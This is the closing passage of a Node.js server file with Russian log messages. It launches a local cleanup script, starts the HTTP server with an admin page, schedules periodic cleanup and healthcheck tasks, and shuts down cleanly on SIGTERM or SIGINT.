  const scriptPath = path.join(PROJECT_ROOT, 'scripts', 'cleanup-backups.js');
  if (!fs.existsSync(scriptPath)) return;
  const node = process.execPath;
  const child = require('child_process').spawn(node, [scriptPath, '--tmp', '--login-cleanup'], { cwd: PROJECT_ROOT, stdio: 'ignore', detached: true });
  child.unref();
}

server.listen(PORT, HOST, () => {
  console.log('Сервер: http://' + HOST + ':' + PORT);
  console.log('Админка: http://' + HOST + ':' + PORT + '/admin.html');
  console.log('[SERVER] SQLite → ' + DB_PATH + (process.env.GMW_DATA_DIR ? ' (GMW_DATA_DIR)' : ' (каталог проекта ./data)'));
  setTimeout(cleanLoginArtifacts, 60 * 1000);
  setInterval(cleanLoginArtifacts, 10 * 60 * 1000);
  setTimeout(runFullCleanup, 2 * 60 * 1000);
  setInterval(runFullCleanup, 10 * 60 * 1000);
  scheduleWebdeLayoutHealthcheck();
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Ошибка: Порт ${PORT} уже занят. Используйте другой порт через переменную PORT.`);
    process.exit(1);
  } else {
    console.error('Ошибка сервера:', err);
    process.exit(1);
  }
});

function shutdown() {
  server.close(() => {
    try {
      closeDb();
    } catch (_) {}
    console.log('Сервер остановлен.');
    process.exit(0);
  });
}

process.on('SIGTERM', () => {
  console.log('Получен SIGTERM, завершаю работу...');
  shutdown();
});

process.on('SIGINT', () => {
  console.log('\nПолучен SIGINT, завершаю работу...');
  shutdown();
});

